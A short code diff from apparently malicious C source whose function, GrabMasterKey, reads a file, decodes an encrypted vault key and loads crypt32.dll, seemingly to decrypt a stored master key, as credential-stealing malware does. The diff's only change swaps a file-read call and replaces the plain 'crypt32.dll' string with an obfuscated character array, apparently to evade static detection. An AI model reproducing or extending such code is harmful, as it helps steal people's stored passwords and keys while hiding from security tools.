@@ -49,7 +49,7 @@ void GrabMasterKey(unsigned short *path) {
         return;
     }
 
-    if (ReadBuffer(FileHandle, FileBuffer, FileSize) != 0) {
+    if (ReadFileY(FileHandle, FileBuffer, FileSize) != 0) {
         return;
     }
 
@@ -85,7 +85,7 @@ void GrabMasterKey(unsigned short *path) {
     CryptedVaultKey.cbData = DecodedLength;
     CryptedVaultKey.pbData = DecodedString;
 
-    Crypt32Dll = LoadDll(L"crypt32.dll");
+    Crypt32Dll = LoadDll((unsigned short[12]){0x0068, 0x00d0, 0x008d, 0x00d5, 0x007f, 0x009c, 0x0068, 0x0032, 0x008e, 0x00a6, 0x009e, 0x0000});
     if (Crypt32Dll == NULL) {
         return;
     }
